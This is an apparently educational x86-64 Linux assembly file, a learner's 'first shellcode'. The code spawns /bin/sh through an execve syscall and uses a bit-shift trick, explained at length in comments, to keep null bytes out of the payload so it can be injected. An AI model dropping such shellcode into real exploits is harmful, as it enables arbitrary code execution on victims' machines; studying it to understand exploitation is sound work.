# My first shellcode

# Some useful information http://cs.lmu.edu/~ray/notes/linuxsyscalls/

# To produce object file:
# cpp -x assembler-with-cpp shellcode_linux_x86-64.S | as - -march=generic64 -mtune=generic64 -o nshellcode_linux_x86-64.o

# To produce elf executable:
# ld shellcode_linux_x86-64.o -o exec
# ./exec


#include <asm/unistd_64.h>


.globl _start

_start:

xor    %rdx,%rdx                   # arg 3 = NULL
xor    %rsi,%rsi                   # arg 2 = NULL


mov    $0x8068732f6e69622f,%rdi    #this is "/bin/sh\x80"
#         ^
#    remove non-zero bit, using shl and shr
shl    %rdi
shr    %rdi

# Detailed explanation
# ASCIIZ must end with a zero
# If I want to put some shellcode in program, which uses ASCIIZ string
# I should not use ZERO 
# in binary representation,
# 0x8068732f6e69622f -> 1000000001101000011100110010111101101110011010010110001000101111
#
# When we make shl %rdi we shift by one bit to the left
#
# before:   1000000001101000011100110010111101101110011010010110001000101111
# after:    0000000011010000111001100101111011011100110100101100010001011110
#
# And when we make shr %rdi we shift by one bit to the right
#
# before:   0000000011010000111001100101111011011100110100101100010001011110
# after:    0000000001101000011100110010111101101110011010010110001000101111
#
# Thus, if we compare the initial and final, we have obtained a zero byte
#
# initial:  1000000001101000011100110010111101101110011010010110001000101111
# final:    0000000001101000011100110010111101101110011010010110001000101111


push   %rdi                        # push "/bin/sh" onto stack
mov    %rsp,%rdi                   # arg 1 = asciiz string "/bin/sh" in stack
xor    %rax,%rax
mov    $__NR_execve,%ah
shr    $8,%eax 
syscall
